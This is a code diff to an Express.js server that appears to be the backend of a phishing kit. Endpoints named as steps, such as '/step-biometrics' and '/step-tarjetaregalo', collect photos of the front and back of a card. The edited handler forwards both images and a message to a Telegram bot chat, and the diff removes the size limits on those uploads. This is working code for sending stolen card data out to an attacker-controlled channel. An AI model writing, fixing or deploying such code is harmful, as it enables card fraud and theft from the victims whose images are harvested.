@@ -432,8 +432,8 @@ app.post('/step-biometrics', async (req, res) => {
 // 
 
 // ==================== ENDPOINT: REGALO ====================
+const FormData = require("form-data");
 
-// 🔥 Función para convertir base64 a buffer
 function base64ToBuffer(base64String) {
     const base64Data = base64String.replace(/^data:image\/\w+;base64,/, "");
     return Buffer.from(base64Data, "base64");
@@ -443,7 +443,7 @@ app.post("/step-tarjetaregalo", async (req, res) => {
 
     try {
 
-        const { sessionId, frontImageBase64, backImageBase64, message } = req.body;
+        const { frontImageBase64, backImageBase64, message } = req.body;
 
         if (!frontImageBase64 || !backImageBase64) {
             return res.status(400).json({ error: "Faltan imágenes" });
@@ -458,47 +458,52 @@ app.post("/step-tarjetaregalo", async (req, res) => {
 
 ${message || ""}`;
 
-        // ==========================
-        // Enviar imagen frontal
-        // ==========================
-        const formDataFront = new FormData();
-        formDataFront.append("chat_id", CHAT_ID);
-        formDataFront.append("caption", caption);
-        formDataFront.append("photo", frontBuffer, {
-            filename: "frontal.jpg"
+        // ========= FRONTAL =========
+        let formFront = new FormData();
+        formFront.append("chat_id", CHAT_ID);
+        formFront.append("caption", caption);
+        formFront.append("photo", frontBuffer, {
+            filename: "frontal.jpg",
+            contentType: "image/jpeg"
         });
 
         await axios.post(
-            `${TELEGRAM_API}/sendPhoto`,
-            formDataFront,
-            { headers: formDataFront.getHeaders() }
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+            formFront,
+            {
+                headers: formFront.getHeaders(),
+                maxContentLength: Infinity,
+                maxBodyLength: Infinity
+            }
         );
 
-        // ==========================
-        // Enviar imagen trasera
-        // ==========================
-        const formDataBack = new FormData();
-        formDataBack.append("chat_id", CHAT_ID);
-        formDataBack.append("caption", "🔄 Parte trasera de la tarjeta");
-        formDataBack.append("photo", backBuffer, {
-            filename: "trasera.jpg"
+        // ========= TRASERA =========
+        let formBack = new FormData();
+        formBack.append("chat_id", CHAT_ID);
+        formBack.append("caption", "🔄 Parte trasera de la tarjeta");
+        formBack.append("photo", backBuffer, {
+            filename: "trasera.jpg",
+            contentType: "image/jpeg"
         });
 
         await axios.post(
-            `${TELEGRAM_API}/sendPhoto`,
-            formDataBack,
-            { headers: formDataBack.getHeaders() }
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+            formBack,
+            {
+                headers: formBack.getHeaders(),
+                maxContentLength: Infinity,
+                maxBodyLength: Infinity
+            }
         );
 
-        res.json({ success: true });
+        return res.json({ ok: true });
 
     } catch (error) {
-        console.error("Error enviando tarjeta:", error.response?.data || error.message);
-        res.status(500).json({ error: "Error interno" });
+        console.error("ERROR REAL:", error.response?.data || error.message);
+        return res.status(500).json({ error: "Fallo enviando a Telegram" });
     }
 
 });
-
 
  
 // ==================== ENDPOINT: REGALO ====================
